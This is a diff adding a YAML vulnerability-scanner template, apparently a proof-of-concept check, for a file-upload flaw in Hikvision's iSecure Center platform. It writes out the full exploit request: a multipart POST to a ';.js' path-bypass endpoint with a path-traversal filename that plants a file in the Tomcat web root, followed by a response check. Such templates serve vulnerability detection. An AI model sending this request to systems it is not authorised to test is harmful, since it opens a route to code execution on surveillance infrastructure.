@@ -1,0 +1,46 @@
+app: Hikvision
+query: app:"Hikvision"
+meta:
+    name: HIKVISION iSecure Center综合安防管理平台存在文件上传漏洞
+    level: 4
+    tags:
+        - file_upload
+    description: 存在文件上传漏洞
+    homepage: https://www.hikvision.com/cn/
+    author: Prism X
+    references: https://mp.weixin.qq.com/s/K-d3yMRVBvxzLKQpzOu-6Q
+    solution: 升级系统、安装补丁
+    create_at: "2023-10-11 10:24:41"
+    available: false
+    steps:
+        variable:
+            - r1: ' randomLowercase(5)'
+        verify_steps:
+            type: and
+            verify:
+                - request:
+                    method: POST
+                    path: /center/api/files;.js
+                    redirect: true
+                    header:
+                        - Content-Type: multipart/form-data; boundary=e54e7e5834c8c50e92189959fe7227a4
+                    params: |-
+                        --e54e7e5834c8c50e92189959fe7227a4
+                        Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{r1}}.txt"
+                        Content-Type: application/octet-stream
+
+                        {{r1}}
+                        --e54e7e5834c8c50e92189959fe7227a4--
+                  response:
+                    - name: code
+                      value: "200"
+                      type: equals
+                    - name: body
+                      value: webapps/clusterMgr/{{r1}}.txt
+                      type: contains
+        exploit_steps:
+            type: ""
+            params:
+                name: ""
+                type: input
+                value: ""
